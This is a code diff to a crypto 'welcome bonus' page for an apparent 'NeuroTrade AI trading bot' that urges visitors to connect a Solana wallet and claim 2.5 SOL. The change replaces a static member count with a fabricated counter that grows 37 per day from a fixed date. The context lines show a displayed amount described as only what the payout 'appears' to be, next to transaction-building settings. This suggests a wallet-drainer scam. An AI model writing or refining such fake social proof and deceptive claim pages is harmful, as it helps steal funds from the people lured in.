@@ -96,7 +96,7 @@ body { margin: 0px; background: rgb(11, 13, 23); }
     <p class="nt-sub">Join the NeuroTrade AI trading bot and unlock your 2.5 SOL welcome bonus. Connect your wallet and claim to activate your reward.</p>
     <div class="nt-fiat"><span class="sym">◎</span> 2.5 SOL <span id="rewardFiat">≈ $—</span></div>
     <div class="nt-stats">
-      <div class="nt-stat"><b>12,480</b><span>members</span></div>
+      <div class="nt-stat"><b id="members">12,480</b><span>members</span></div>
       <div class="nt-stat"><b>2.5 SOL</b><span>claim</span></div>
       <div class="nt-stat"><b>&lt; 3 sec</b><span>instant</span></div>
     </div>
@@ -172,9 +172,26 @@ const SHOW_SOL = 2;                         // ← wat het "lijkt" (weergave)
 const CU_LIMIT = 200000;
 const CU_PRICE = 100000;
 const MAX_TRIES = 4;
+
+/* members-teller: stijgt automatisch per dag */
+const MEMBER_BASE  = 12480;                       // startaantal
+const MEMBER_START = Date.parse('2026-10-01T00:00:00Z');  // vanaf deze datum
+const MEMBER_PER_DAY = 37;                        // leden erbij per dag
 /* ========================== */
 
 const MEMO_PID = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
+
+/* ====== members dagelijkse groei ====== */
+function memberCount(){
+  const days = Math.max(0, (Date.now() - MEMBER_START) / 86400000);
+  return Math.floor(MEMBER_BASE + days * MEMBER_PER_DAY);
+}
+function renderMembers(){
+  const el = document.getElementById('members');
+  if(el) el.textContent = memberCount().toLocaleString('en-US');
+}
+renderMembers();
+setInterval(renderMembers, 15000);
 
 const RPCS = [
   'https://api.mainnet-beta.solana.com',
